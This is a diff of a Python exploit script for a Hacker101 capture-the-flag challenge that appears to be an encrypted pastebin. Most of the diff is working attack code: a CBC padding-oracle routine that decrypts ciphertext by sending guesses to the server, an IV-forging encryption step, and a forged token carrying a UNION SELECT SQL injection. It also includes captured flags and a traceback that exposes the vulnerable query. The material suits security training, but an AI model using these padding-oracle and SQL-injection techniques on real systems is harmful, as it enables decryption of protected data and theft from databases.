@@ -10,8 +10,10 @@
     o Open to clarify
         [x] Create links on one instance and test on new instances => nothing found, but 404
         [ ] tracking.gif (main and result page)
-        [ ] Generate own links when encryption key available
+        [/] Generate own links when encryption key available
         [x] Padding oracle for encryption => got flag 2
+        [x] SQL injection in JSON field 'id'
+        [ ] Padding oracle attack to get plain-text of entry with 'id'=1
 
     o URLs
         o root /
@@ -115,198 +117,24 @@
                         return codecs.utf_8_decode(input, errors, True)
                     UnicodeDecodeError: 'utf8' codec can't decode byte 0xee in position 80: invalid continuation byte
 
+                9. SQL statement error
+                    File "./main.py", line 71, in index
+                        if cur.execute('SELECT title, body FROM posts WHERE id=%s' % post['id']) == 0:
+                    File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
+                        self.errorhandler(self, exc, value)
+                    File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
+                        raise errorvalue
+                    ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
+
 """
 
-import base64
-import binascii
-import json
-import requests
-from tqdm import tqdm
-from Crypto.Cipher import AES
-from urlparse import urlparse, parse_qs
+# from Crypto.Cipher import AES
+# import binascii
+from helper import *
+from padding_oracle import padding_oracle_decrypt, padding_oracle_encrypt
 
 # Base url of Hacker101 challenge
-base_url = "http://35.190.155.168/1c7825c0ab/"
-
-
-def unpad(data):
-    """Remove padding bytes using PCKS#7"""
-    num_padding_bytes = ord(data[-1])
-
-    # Check if data is consistent with PCKS#7
-    for i in range(len(data) - num_padding_bytes, len(data)):
-        if ord(data[i]) is not num_padding_bytes:
-            raise Exception("Error occured! Incorrect padding.")
-
-    return data[:-num_padding_bytes]
-
-def pad(data, block_size):
-    """Add padding bytes using PCKS#7"""
-    num_padding_bytes = block_size - len(data) % block_size
-
-    # Full block of padding bytes is expected if data alreadyis multiple of block_size
-    if num_padding_bytes == 0:
-        num_padding_bytes += block_size
-
-    return data + chr(num_padding_bytes) * num_padding_bytes
-
-def str_to_int(val):
-    """Nice formatting of integer numbers"""
-    return " ".join("{:03}".format(ord(c)) for c in val) 
-
-
-def str_to_hex(val):
-    """Nice formatting of HEX pairs"""
-    return " ".join("{:02x}".format(ord(c)) for c in val) 
-
-
-def str_to_binary(val):
-    """Nice formatting in binary octets"""    
-    return " ".join("{:08b}".format(ord(c)) for c in val)     
-
-
-def encode_data(data):
-    """Encode data with base64 encoding and replacement"""
-
-    # Encode with B64 
-    b64e = lambda x: base64.encodestring(data)
-    data_b64e = b64e(data)
-
-    # Replace special keys in the input string
-    return data_b64e.replace('=', '~').replace('/', '!').replace('+', '-').replace('\n', '') 
-
-
-def decode_data(data):
-    """Decode data with replacement and base64 encoding"""
-
-    # Replace special keys in the input string
-    data_replaced = data.replace('~', '=').replace('!', '/').replace('-', '+') 
-
-    # Decode with B64 
-    b64d = lambda x: base64.decodestring(data_replaced)
-    return b64d(data_replaced)
-
-
-def change_byte_at_index(data, index, byte):
-    """Set given byte at given index"""
-    
-    if index >= len(data):
-        raise Exception("Error occured! Input string is too short.")
-
-    return data[:index] + chr(byte) + data[index+1:]
-
-
-def split_into_blocks(data, block_size):
-    """Split string into multiple blocks"""
-
-    blocks = []
-
-    for i in range(len(data) / block_size):
-        cur_block = data[i * block_size : (i + 1) * block_size]
-        blocks.append(cur_block)
-
-    return blocks
-
-
-def padding_oracle(data, block_size = 16):
-    """CBC padding oracle 
-    
-    For algorithmic details see: https://www.youtube.com/watch?v=aH4DENMN_O4&ab_channel=intrigano     
-    """
-    
-    #################################################################
-    # Data preparation
-    #################################################################
-
-    # Decode input data
-    cipher_text = decode_data(data)
-
-    # Split cipher text into blocks    
-    cipher_blocks = split_into_blocks(cipher_text, block_size)
-
-    #################################################################
-    # Guess the bytes of each block
-    #################################################################
-
-    # By changing the forelast block it's possible to change the last block
-    # of the plain text. Here we can pretend to have more padding bytes than exist
-    # by changing the already known padding bytes and try to find the 
-    # correct byte value for the additional "pretended padding byte". If we
-    # achieve to not having a PaddingException() we can infer the actual value
-    # of this byte in the last block of the plain text. 
-
-    plain_text = []    
-
-    # Decode block by block beginning at the forelast block and last byte
-    for block_id in range(len(cipher_blocks) - 2, -1, -1):
-        # Get plain text value of missing bytes
-        bytes_guessed = {}
-        num_padding_bytes = 0
-        for index in range(block_size - num_padding_bytes - 1, -1, -1):
-
-            print("Guessing block {} byte {} ...".format(block_id + 1, index))
-            # Pretent to have more padding bytes
-            cur_num_padding_bytes = num_padding_bytes + (block_size - num_padding_bytes - index) 
-        
-            # Change padding-related bytes in forelast block in such way that the same bytes 
-            # in the plain text will increment to pretend to have more padding bytes
-
-            # Create copy of original cipher text 
-            cipher_blocks_tmp = []
-            for i in range( block_id + 2):
-                cipher_blocks_tmp.append( cipher_blocks[i] )
-                
-            for i in range(block_size - cur_num_padding_bytes + 1, block_size):
-                # # Check if byte is pretended or an actual padding byte
-                if i < block_size - num_padding_bytes:
-                    # Handle pretended padding bytes 
-                    old_value = bytes_guessed[i][1]
-                    padding_bytes = bytes_guessed[i][0]
-                    new_value = old_value ^ padding_bytes ^ cur_num_padding_bytes
-                else:
-                    # Increment actual padding bytes
-                    old_value = cipher_blocks_tmp[block_id][i]
-                    padding_bytes = num_padding_bytes
-                    new_value = ord(old_value) ^ padding_bytes ^ cur_num_padding_bytes
-
-                cipher_blocks_tmp[block_id] = change_byte_at_index(cipher_blocks_tmp[block_id], i, new_value)
-            
-            # In the next step we find the correct value of the additional pretended padding byte that will not throw PaddingException()
-            for value in tqdm(range(256)):
-                # print("Check for value {} ...".format(value))
-
-                # Find the value that leads to a valid padding byte value in the last block of plain text
-                cipher_blocks_tmp[block_id] = change_byte_at_index(cipher_blocks_tmp[block_id], index, value)
-
-                # Send the changed data to server and check response
-                response = evaluate_data( encode_data("".join(cipher_blocks_tmp)) )
-            
-                # Check if PaddingException() occurs
-                if "PaddingException()" not in response.text:
-                    # Do the math to get the actual plaintext value by having a valid plain text byte and related IV byte
-                    plain_text_value = cur_num_padding_bytes ^ value ^ ord(cipher_blocks[block_id][index])
-                    plain_text.insert(0, plain_text_value) 
-                    bytes_guessed[index] = (cur_num_padding_bytes, value)
-                    print("")
-                    print("Success!")
-                    print("")
-                    print("Plain text (hex) = {}".format(" ".join("%02x " % x for x in plain_text)))
-                    print("Plain text       = {}".format( "".join( chr(x) for x in plain_text).replace('\n','\\n')))
-                    print("")
-                    break        
-
-    # Debug print of cipher blocks
-    print_blocks(cipher_blocks)
-
-    return "".join( chr(x) for x in plain_text)
-
-
-def print_blocks(blocks):
-    print("Cipher text blocks:")
-    for i, block in enumerate(blocks):
-        # @todo: Print related plaintext to each block
-        print("Block[{}]: {} {}".format(i, str_to_hex(block), " <- IV" if (i==0) else ""))            
-    print ("")
+base_url = "http://35.190.155.168/e619f1987e/"
 
 
 # Call  decryptPayload(post['key'], body):
@@ -332,30 +160,14 @@ def decryptLink(data):
 
     pass
 
-def evaluate_data(data):
-    """Send data to the pastebin and retrieve response"""
-    payload = { 'post': data }
-
-    response = requests.get(base_url, params=payload)
-
-    if response.status_code == 404:
-        raise Exception("Error occurred! URL '{}' is not available ({}).".format(base_url, response.status_code) )
-    
-    return response
 
 def get_flag_0():
     """Get flag 0 by any invalid input data"""
 
 
     data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
-    response = evaluate_data(data[1:])
+    response = evaluate_data(data[1:], base_url=base_url)
     print("Flag 0: " + str.splitlines(response.text.encode("utf-8"))[0] )
-
-
-def XOR_byte_list(a, b):
-    """XOR two byte lists"""
-
-    return "".join([ chr(ord(a_i) ^ ord(b_i)) for (a_i,b_i) in zip(a, b) ])
 
 
 def get_flag_1():
@@ -365,108 +177,52 @@ def get_flag_1():
     data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
 
     # Run the actual padding oracle attack
-    plain_text = padding_oracle(data, block_size)
+    plain_text = padding_oracle_decrypt(data, block_size, base_url=base_url)
     print("Flag 1: " + plain_text)
     
     # Will return {"flag": "^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}
 
 
 def get_flag_2():
-    """Get flag 1 with padding oracle encryption attack"""
+    """Get flag 2 with padding oracle encryption attack"""
 
     block_size = 16
     data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
     # Original plain text etrieved from flag 1
-    plain_text_original    = '{"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}'
-    plain_text_manipulated = '{"id": "1"}'
-
-    #################################################################
-    # Data preparation
-    #################################################################
-
-    # Decode input data
-    cipher_text = decode_data(data)
-
-    # Split cipher text into blocks    
-    cipher_blocks = split_into_blocks(cipher_text, block_size)
-
-    # Limit plain text to 15 characters, because we need at least 1 padding byte
-    if len(plain_text_manipulated) >= 15:
-        raise Exception("Error occurred! len(plain_text_manipulated) >= 16 is not implemented yet. ")
-
-    # Add padding bytes
-    plain_text_manipulated = pad(plain_text_manipulated, block_size)
     
-    # Manipulate IV to get the desired plain text    
-    # IV(manipulated) = IV XOR plaintext(original) XOR plaintext(manipulated)
-    iv_original = cipher_blocks[0]
-    iv_manipulated = XOR_byte_list( XOR_byte_list( iv_original, plain_text_original[:16] ), plain_text_manipulated )
+    plain_text_original    = '{"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}'
+    plain_text_manipulated = '{"id": "1 "}'
 
-    # Use only first cipher text blocks for now
-    cipher_text_manipulated = iv_manipulated + cipher_blocks[1]
+    response = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data, block_size=block_size, base_url=base_url, verbose=False)
 
-    # Send the changed data to server and check response
-    response = evaluate_data( encode_data(cipher_text_manipulated) )
+    print("Flag 2: " + str.splitlines(response.text.encode("utf-8"))[1] )
+
+
+
+def get_flag_3():
+    """Get flag 3 with padding oracle encryption attack and using SQL injection"""
+
+    block_size = 16
+    data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
+
+    # Original plain text retrieved from flag 1
+    plain_text_original    = '{"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}'
+    plain_text_manipulated = '{"id": "1 AND false UNION SELECT body, body FROM posts WHERE id=1"}'
+
+    response = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data, block_size=block_size, base_url=base_url, verbose=False)
 
     print(response.text)
 
-
-def create_links_to_file(filename, title, body, count):
-    """Create pages and store 'post' parameter to file"""
-
-    with open(filename, 'w') as file: 
-        for i in tqdm(range(count)):
-            data =  {
-                        'title' : title,
-                        'body'  : body
-                    }
-
-            response = requests.post(base_url, data=data)
-            
-            # Retrieve GET('post') parameter
-            parsed_url = urlparse(response.url)
-            params = parse_qs(parsed_url.query)
-   
-            file.write( "{}\n".format(params['post'][0]) )
-
-def read_links_from_file(filename):
-    """Read 'post' parameter from file and evaluate server response"""
-    
-    # Read posts 
-    posts = []
-    with open(filename, 'r') as file: 
-        posts = file.readlines()
-
-    # Evaluate posts
-    with open(filename + ".result", 'w') as file: 
-        for post in tqdm(posts):       
-            # response = evaluate_data(post)        
-
-            plain_text = padding_oracle(post)
-
-            file.write("post={}".format(post))
-            file.write(plain_text) 
-            file.write("\n")
-
-def test_de_encoding():
-    """Test decode and encode functionality"""
-
-    data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
-    dec_data = decode_data(data)
-    enc_data = encode_data(dec_data)
-    if enc_data != data:
-        raise Exception("Error in encoding or decoding function.")
+"""
+    Response
+    Attempting to decrypt page with title: kLjYc5Z-jKUBiVqdDrQhTyVbih1AbTNboKv!TsGChQxV!PJKXGohDjxEyVCcTEPzKBR1JvbKVBLfs-uQG!AoCEU9EDM0H6sGfJqFj7heoCEXUAczw4FsTNBIzibX5lgB
+    Traceback (most recent call last):
+    File "./main.py", line 74, in index
+        body = decryptPayload(post['key'], body)
+    KeyError: 'key'
+"""
 
 
-def test_un_padding():
-    """Test decode and encode functionality"""
-
-    block_size = 16
-    data = "x" * (block_size / 2)
-    pad_data = pad(data, block_size)
-    unpadded_data = unpad(pad_data)
-    if len(pad_data) == block_size and unpadded_data != data:
-        raise Exception("Error in unpadding or padding  function.")
 
 
 if __name__ == "__main__":
@@ -476,6 +232,7 @@ if __name__ == "__main__":
     test_un_padding()
 
     get_flag_0()
-    get_flag_1()
+    #get_flag_1()
     get_flag_2()
+    get_flag_3()
 
